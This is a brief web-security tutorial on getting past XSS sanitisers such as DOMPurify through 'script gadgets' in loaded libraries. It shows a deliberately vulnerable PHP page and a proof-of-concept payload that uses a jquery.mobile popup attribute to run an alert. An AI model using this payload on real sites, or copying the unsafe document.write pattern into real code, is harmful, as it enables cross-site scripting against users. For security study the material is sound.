Bypass Via Script Gadgets
================================

Introduction
--------------------------------
Some websites will use whitelists or some DOM-based defense methods. For these methods, there is an attack method called ``Code Reuse`` that can be bypassed. This method is similar to Gadget in binary attack and defense, using legitimate code in the target to bypass defense measures. This method is described in detail in the paper ``Code-Reuse Attacks for the Web: Breaking Cross-Site Scripting Mitigations via Script Gadgets``.

A blog post by portswigger also expressed similar thoughts ``https://portswigger.net/blog/abusing-javascript-frameworks-to-bypass-xss-mitigations``.

Here is a simple example that uses ``DOMPurify`` for hardening, but can be attacked because of the introduction of ``jquery.mobile.js``.

example
--------------------------------
::

    // index.php
    <?php

    $msg = $_GET['message'];
    $msg = str_replace("\n", "", $msg);
    $msg = base64_encode($msg);

    ?>

    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Preview</title>
        <script type="text/javascript" src="purify.js"></script>
        <script type="text/javascript" src="jquery.js"></script>
        <script type="text/javascript" src="jquery.mobile.js"></script>
    </head>
    <body>
        
        <script type="text/javascript">
        var d= atob('<?php echo $msg; ?>');
        var cleanvar = DOMPurify.sanitize(d);
        document.write(cleanvar);
        </script>

    </body>
    </html>


::

    // payload
    <div data-role=popup id='-->
    &lt;script&gt;alert(1)&lt;/script&gt;'>
    </div>
